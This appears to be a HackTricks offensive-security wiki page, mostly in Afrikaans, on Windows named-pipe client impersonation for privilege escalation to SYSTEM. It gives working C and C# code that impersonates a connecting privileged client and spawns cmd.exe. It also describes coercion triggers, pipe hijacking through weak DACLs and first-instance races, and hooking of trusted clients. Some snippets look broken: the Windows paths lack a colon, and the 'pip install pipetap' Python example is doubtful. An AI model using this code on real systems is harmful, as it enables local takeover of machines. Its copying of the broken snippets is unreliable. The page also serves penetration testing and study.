# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is ’n local privilege escalation-primitive wat ’n named-pipe-server thread toelaat om die security context van ’n client wat daaraan koppel, oor te neem. In die praktyk kan ’n aanvaller wat code met SeImpersonatePrivilege kan uitvoer, ’n bevoorregte client (bv. ’n SYSTEM service) dwing om aan ’n attacker-controlled pipe te koppel, ImpersonateNamedPipeClient roep, die gevolglike token na ’n primary token dupliseer, en ’n process as die client spawn (dikwels NT AUTHORITY\SYSTEM).

Hierdie bladsy fokus op die kerntegniek. Vir end-to-end exploit chains wat SYSTEM na jou pipe dwing, sien die Potato family-bladsye waarna hieronder verwys word.

## TL;DR
- Create a named pipe: \\.\pipe\<random> en wag vir ’n connection.
- Laat ’n privileged component daaraan koppel (spooler/DCOM/EFSRPC/etc.).
- Lees ten minste een message van die pipe, en roep dan ImpersonateNamedPipeClient aan.
- Open die impersonation token van die current thread, DuplicateTokenEx(TokenPrimary), en CreateProcessWithTokenW/CreateProcessAsUser om ’n SYSTEM process te kry.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
- SeImpersonatePrivilege om ’n connecting client suksesvol te impersonate en om CreateProcessWithTokenW te gebruik.
- Alternatiewelik, nadat jy SYSTEM geimpersonate het, kan jy CreateProcessAsUser gebruik, wat moontlik SeAssignPrimaryTokenPrivilege en SeIncreaseQuotaPrivilege vereis (hierdie word vervul wanneer jy SYSTEM impersonate).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (moet ten minste een message lees voor impersonation)
- ImpersonateNamedPipeClient en RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW of CreateProcessAsUser
- Impersonation level: om nuttige actions plaaslik uit te voer, moet die client SecurityImpersonation toelaat (default vir baie local RPC/named-pipe clients). Clients kan dit verlaag met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wanneer hulle die pipe oopmaak.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- As ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) teruggee, maak seker dat jy eers van die pipe lees en dat die client nie impersonation tot Identification level beperk het nie.
- Verkies DuplicateTokenEx met SecurityImpersonation en TokenPrimary om 'n primary token te skep wat geskik is vir process creation.

## .NET quick example
In .NET kan NamedPipeServerStream via RunAsClient impersonate. Sodra jy impersonating is, duplicate die thread token en skep 'n process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Hierdie tegnieke dwing geprivilegieerde dienste om aan jou named pipe te koppel sodat jy hulle kan impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Sien gedetailleerde gebruik en compatibility hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

As jy net ’n volledige example nodig het van die crafting van die pipe en impersonating om SYSTEM vanaf ’n service trigger te spawn, sien:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wanneer ’n geprivilegieerde service en ’n lae-geprivilegieerde proses oor `\\.\pipe\...` kommunikeer, behandel die pipe soos enige ander untrusted IPC boundary. Behalwe vir klassieke server-side impersonation, kan swak pipe ACLs, unsafe creation flags, en client-side trust decisions ook almal local privilege escalation primitives word.

### Enumereer eers kandidaat pipes
- Lys pipes vinnig vanaf PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` is nuttig om instance counts en single-instance pipes raak te sien.
- Prioritiseer name wat deur services gebruik word wat as `SYSTEM` loop, veral helpers, updaters, launchers, en UI brokers.

### MITM via permissive DACLs en ekstra pipe instances
- Enige proses wat met ’n geprivilegieerde server kan praat, kan reeds sy protocol fuzz en geprivilegieerde verbs soek.
- Die meer interessante geval is wanneer die DACL `FILE_GENERIC_WRITE`/`GENERIC_WRITE` op die pipe object toeken. Op named pipes sluit dit implisiet `FILE_CREATE_PIPE_INSTANCE` in (`FILE_APPEND_DATA` deel dieselfde bit), so ’n aanvaller kan nog ’n server instance met dieselfde name skep.
- Omdat instances in FIFO order gepaar word, kan attacker-created en legitimate instances afgewissel word: skep ’n rogue instance met `CreateNamedPipe`, open dan dieselfde pipe name met `CreateFile`, en wag vir ’n regte client om op die rogue server instance te land.
- Resultaat: observeer, modify, relay, of desynchronize geprivilegieerde IPC sonder om die oorspronklike server process te besit.

### First-instance race op pipe security descriptors
- `lpSecurityAttributes` definieer slegs die DACL wanneer die eerste instance van ’n pipe name geskep word.
- As ’n geprivilegieerde service laat begin en nie `FILE_FLAG_FIRST_PIPE_INSTANCE` gebruik nie, kan ’n aanvaller die pipe name vooraf skep met ’n permissive DACL, en dan die service later instances laat skep onder die attacker-chosen security context.
- Dit maak service startup ’n race condition: wen die eerste instance, en koppel dan of MITM later clients met behulp van die verswakte ACL.
- Mitigation vir defenders, en ’n sleutel review point vir attackers: kyk of `CreateNamedPipe(..., dwOpenMode, ...)` `FILE_FLAG_FIRST_PIPE_INSTANCE` insluit. Indien nie, toets pre-creation voor die service begin.

### PID/signature checks is hardening, nie ’n boundary nie
- Sommige products probeer toegang beperk deur `GetNamedPipeClientProcessId`, process image path, of Authenticode signer van die connecting client te check.
- Dit help net totdat jy in die legitimate client inject: sodra jy binne die trusted process is, erf jy die presiese PID/image/signature context wat die server verwag.
- Vir split desktop apps is dit dikwels makliker om die lae-geprivilegieerde UI/helper process te instrumenteer as om die `SYSTEM` service direk aan te val.

### Hook die client volgens sy I/O model
- Synchronous I/O: intercept `NtWriteFile` voordat die syscall die buffer verbruik, en inspect/patch `NtReadFile` nadat dit terugkeer.
- Overlapped I/O: stoor die `OVERLAPPED`/`IoStatusBlock` wat in `NtReadFile` gesien is, en inspect dan die buffer nadat `GetOverlappedResult` of die relevante wait voltooi.
- Completion ports: `GetQueuedCompletionStatus` bereik `NtRemoveIoCompletion`; die teruggekeerde `ApcContext` koppel terug na die `OVERLAPPED` wat vir die oorspronklike read gebruik is, wat die regte pivot is om die nou-gevulde buffer te vind.
- Completion routines (`ReadFileEx`): die completion callback word as ’n APC afgelewer. As jy returned data wil tamper of synthetic replies wil inject, hook die regte completion routine en, vir custom injection, gebruik ’n one-argument `QueueUserAPC` dispatcher wat die routine se 3 verwagte arguments rekonstrueer.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy named-pipe traffic through an injected helper DLL en stel ’n Burp-like workflow vir editing/replay bloot.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) neem ’n Frida-based approach en fokus op hooking `NtReadFile`/`NtWriteFile` plus die async/completion pivots hierbo, en stuur dan traffic aan na ’n WebSocket-backed editing workflow.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operasionele oorwegings
- Named pipes het lae latency; lang pouses terwyl buffers geredigeer word kan brose dienste deadlock.
- Overlapped/completion-port/APC-gedrewe clients benodig ander hooks as eenvoudige `ReadFile`/`WriteFile` detours.
- Injection in die vertroude client is noisy en oor die algemeen die beste om te hou vir exploit development, protocol reversing, of local lab fuzzing.

## Troubleshooting and gotchas
- Jy moet ten minste een message uit die pipe lees voordat jy `ImpersonateNamedPipeClient` aanroep; anders sal jy `ERROR_CANNOT_IMPERSONATE (1368)` kry.
- As die client koppel met `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, kan die server nie ten volle impersonate nie; kontroleer die token se impersonation level via `GetTokenInformation(TokenImpersonationLevel)`.
- `CreateProcessWithTokenW` vereis `SeImpersonatePrivilege` op die caller. As dit faal met `ERROR_PRIVILEGE_NOT_HELD (1314)`, gebruik `CreateProcessAsUser` nadat jy reeds SYSTEM impersonated het.
- Maak seker jou pipe se security descriptor laat die teiken service toe om te koppel as jy dit harden; by verstek is pipes onder `\\.\pipe` toeganklik volgens die server se DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
